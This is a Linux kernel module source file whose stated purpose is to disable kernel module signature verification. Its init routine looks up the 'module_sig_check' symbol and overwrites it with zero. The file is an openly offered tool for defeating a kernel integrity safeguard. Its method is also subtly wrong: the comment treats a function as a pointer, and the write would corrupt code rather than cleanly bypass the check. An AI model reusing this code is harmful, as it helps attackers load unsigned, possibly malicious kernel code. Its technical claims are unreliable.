#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/errno.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Badmaneers");
MODULE_DESCRIPTION("Kernel module to disable module signature verification");

static int __init disable_module_sig_init(void) {
    unsigned long *module_sig_check;

    pr_info("Attempting to disable module signature verification...\n");

    // Locate the module_sig_check function using kallsyms
    module_sig_check = (unsigned long *)kallsyms_lookup_name("module_sig_check");
    if (!module_sig_check) {
        pr_err("Failed to locate 'module_sig_check' symbol. Signature bypass aborted.\n");
        return -ENOENT; // No such entity error
    }

    // Modify the function pointer to bypass the signature check
    *module_sig_check = (unsigned long)0;
    pr_info("Module signature verification disabled successfully.\n");

    return 0;
}

static void __exit disable_module_sig_exit(void) {
    pr_info("Signature verification bypass module unloaded.\n");
}

module_init(disable_module_sig_init);
module_exit(disable_module_sig_exit);
